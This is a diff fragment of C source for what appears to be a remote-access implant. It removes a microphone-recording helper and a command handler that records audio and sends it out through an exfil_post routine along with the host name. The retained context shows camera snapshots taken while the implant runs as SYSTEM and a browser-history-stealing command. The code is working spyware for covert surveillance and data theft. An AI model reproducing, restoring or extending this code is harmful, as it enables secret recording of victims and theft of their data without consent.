@@ -437,21 +437,6 @@ int main(int argc, char **argv)
         return 0;
     }
 
-    /* Mic-record helper: spawned in the user session by spy_mic_record when
-     * the main implant is running as SYSTEM.  Records audio, writes WAV. */
-    if (argc >= 4 && strcmp(argv[1], "--mic-record") == 0) {
-        int dur = atoi(argv[2]);
-        if (dur <= 0) dur = 10;
-        int len = 0;
-        char *data = spy_mic_record(dur, &len);
-        if (data) {
-            FILE *fp = fopen(argv[3], "wb");
-            if (fp) { fwrite(data, 1, len, fp); fclose(fp); }
-            free(data);
-        }
-        return 0;
-    }
-
     /* Camera helper: spawned in the user session by spy_camera_snapshot when
      * the main implant is running as SYSTEM.  Captures frame, writes BMP. */
     if (argc >= 3 && strcmp(argv[1], "--camera-snapshot") == 0) {
@@ -875,39 +860,6 @@ int main(int argc, char **argv)
                 locked_send(&resp, conn);
             } else {
                 char *err = "history steal failed (not found or access denied)";
-                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
-                locked_send(&resp, conn);
-            }
-#endif
-            break;
-        }
-
-        case COMMAND_MIC_RECORD: {
-            int duration = 10;
-            if (pkt->payload_len > 0) {
-                char dur_str[16];
-                int n = pkt->payload_len < 15 ? pkt->payload_len : 15;
-                memcpy(dur_str, pkt->payload, n);
-                dur_str[n] = '\0';
-                int d = atoi(dur_str);
-                if (d > 0) duration = d;
-            }
-            int len = 0;
-            char *data = spy_mic_record(duration, &len);
-#ifdef _WIN32
-            if (data) {
-                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
-                DWORD hn_len = sizeof(hostname);
-                GetComputerNameA(hostname, &hn_len);
-                char filename[128];
-                _snprintf(filename, sizeof(filename), "mic_%ld.wav", (long)time(NULL));
-                exfil_post(hostname, filename, data, len);
-                free(data);
-                char *ack = "microphone recording exfiltrated";
-                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
-                locked_send(&resp, conn);
-            } else {
-                char *err = "mic record failed (no device or access denied)";
                 Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
                 locked_send(&resp, conn);
             }
